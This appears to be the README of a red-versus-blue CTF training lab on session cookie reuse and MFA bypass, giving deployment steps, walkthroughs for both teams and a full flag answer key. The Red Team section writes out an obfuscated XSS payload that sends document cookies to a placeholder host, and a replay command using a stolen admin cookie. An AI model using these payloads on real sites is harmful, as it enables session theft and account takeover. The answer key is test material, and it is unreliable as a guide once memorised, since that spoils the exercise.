# Red vs Blue CTF Lab - Cookies Reuse & MFA Bypass

**SCENARIO75** - Cyber Range Engineering Practical Assessment
**Author:** kgsslhn 

---

## Overview

Self-contained CTF lab demonstrating **session token reuse & MFA bypass** in an "Admin Feedback System". Designed for Red Team (exploit chain) and Blue Team (log forensics) training.

Containerized with Docker Compose, deployable on **Proxmox VE**.

---

## Architecture
Proxmox VE

└── LXC Container 100 (feedback-admin-local, 192.168.137.71)

└── Docker Compose

└── admin-feedback container

├── Node.js app :3075

├── SSH (analyst) :2275

└── Logs /opt/admin/logs


---

## Deployed Instance

- **Web App:** `http://192.168.137.71:3075`
- **SSH Blue Team:** `ssh analyst@192.168.137.71 -p 2275` (password: `blue_team_rocks`)
- **Log Location:** `/opt/admin/logs/`

---

## Quick Deploy (Proxmox)

```bash
# 1. Download LXC template
pveam download local debian-12-standard_12.12-1_amd64.tar.zst

# 2. Create & start container
pct create 100 local:vztmpl/debian-12-standard_12.12-1_amd64.tar.zst --hostname feedback-admin-local --memory 1024 --cores 2 --rootfs local-lvm:4 --net0 name=eth0,bridge=vmbr0,ip=dhcp --features nesting=1 --unprivileged 1 --onboot 1
pct start 100
pct enter 100

# 3. Install Docker
apt update && apt install -y ca-certificates curl gnupg git
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
apt update && apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin

# 4. Deploy lab
cd /opt
git clone https://github.com/kgsslhn/redvsblue-lab.git
cd redvsblue-lab
docker compose up -d --build
docker exec admin-feedback sh /inject-logs.sh
Red Team Walkthrough
Target: http://192.168.137.71:3075

Phase 1 - Recon
bash
curl -sI http://192.168.137.71:3075 | grep -i x-powered-by
curl http://192.168.137.71:3075/robots.txt
curl http://192.168.137.71:3075/ | grep -i robots
curl -sI http://192.168.137.71:3075 | grep -i set-cookie
Phase 2 - WAF Bypass via XSS
bash
curl -X POST http://192.168.137.71:3075/api/feedback -d 'message=<script>x</script>'
curl -X POST http://192.168.137.71:3075/api/feedback -d 'message=<svg onload=fetch("http://x/?"+window["docu"+"ment"]["coo"+"kie"])>'
Phase 3 - MFA Bypass (Session Replay)
bash
curl -b "adm_sess=stolen_admin_cookie" http://192.168.137.71:3075/dashboard
Flag: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}

Blue Team Walkthrough
Access: ssh analyst@192.168.137.71 -p 2275 (password: blue_team_rocks)

Phase 1 - Log Forensics
bash
ls /opt/admin/logs/
grep 10.10.14.50 /opt/admin/logs/access.log
grep "18:51:55" /opt/admin/logs/access.log
Phase 2 - Threat Hunting
bash
grep 192.168.1.100 /opt/admin/logs/access.log
grep "18:50:15" /opt/admin/logs/error.log
grep "verify-mfa" /opt/admin/logs/access.log | grep 10.10.14.50
Phase 3 - Incident Response
bash
grep CRITICAL /opt/admin/logs/error.log
grep "18:53:10" /opt/admin/logs/error.log
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
Flag: SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}

Flags Reference
Red Team
#	Flag
1	SCENARIO75{Node.js}
2	SCENARIO75{/api/verify-mfa}
3	SCENARIO75{/dashboard}
4	SCENARIO75{robots.txt}
5	SCENARIO75{pre_mfa_session}
6	SCENARIO75{pending_mfa_verification}
7	SCENARIO75{POST}
8	SCENARIO75{403}
9	SCENARIO75{<svg>}
10	SCENARIO75{window['docu'+'ment']['coo'+'kie']}
11	SCENARIO75{False}
12	SCENARIO75{fetch}
13	SCENARIO75{adm_sess}
14	SCENARIO75{xss-payload}
15	SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
Blue Team
#	Flag
1	SCENARIO75{/opt/admin/logs}
2	SCENARIO75{10.10.14.50}
3	SCENARIO75{Mozilla/5.0}
4	SCENARIO75{200}
5	SCENARIO75{18:51:55}
6	SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}
7	SCENARIO75{192.168.1.100}
8	SCENARIO75{10.10.14.0/24}
9	SCENARIO75{/opt/admin/logs/error.log}
10	SCENARIO75{<script>}
11	SCENARIO75{18:50:15}
12	SCENARIO75{No}
13	SCENARIO75{Base64}
14	SCENARIO75{44}
15	SCENARIO75{CRITICAL}
16	SCENARIO75{18:53:10}
17	SCENARIO75{Authentication bypass anomaly}
18	SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
Repository Structure
text
redvsblue-lab/
├── README.md
├── Dockerfile
├── docker-compose.yml
├── server.js
├── package.json
├── entrypoint.sh
├── inject-logs.sh
├── setup-ssh.sh
├── provision-vm.sh
├── .gitignore
├── public/
└── logs/
    ├── access.log
    └── error.log
Credentials
Service	User	Password	Port
Web App	-	-	3075
SSH (Blue)	analyst	blue_team_rocks	2275
